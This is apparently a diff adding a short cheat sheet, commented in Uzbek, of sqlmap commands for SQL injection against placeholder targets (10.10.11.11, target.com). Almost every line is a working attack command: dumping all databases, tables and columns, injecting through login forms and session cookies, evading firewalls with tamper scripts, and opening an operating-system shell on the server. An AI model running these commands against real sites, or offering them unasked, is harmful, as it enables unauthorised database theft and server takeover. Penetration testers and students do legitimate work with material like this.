@@ -1,0 +1,24 @@
+sqlmap -u http://10.10.11.11 --dbs --batch
+sqlmap -u http://10.10.11.11 -D databas_name --tables
+sqlmap -u http://10.10.11.11 -D database_name -T table_name --columns
+sqlmap -u http://10.10.11.11 -D database_name -T table_name -C columns1,columns2 --dump
+sqlmap -u http://10.10.11.11 --dump-all
+
+#Agar saytda login formasi bo‘lsa, POST so‘rov orqali SQL Injection aniqlash.
+sqlmap -u "http://target.com/login.php" --data="username=admin&password=1234" --dump
+
+
+#Agar sayt cookie orqali autentifikatsiya qilsa, 
+bu usul orqali SQL Injectionni tekshirish mumkin.
+sqlmap -u "http://target.com/dashboard.php" --cookie="PHPSESSID=123456789" --dbs
+
+
+#Havfsizlik devorlarini chetlab o‘tish
+sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment
+
+
+#Ma'lumotlar bazasi serverining versiyasini ko‘rsatadi.
+sqlmap -u "http://target.com/page.php?id=1" --banner
+
+#Agar zaiflik bo‘lsa, serverga shell hujum qilish imkonini beradi.
+sqlmap -u "http://target.com/page.php?id=1" --os-shell
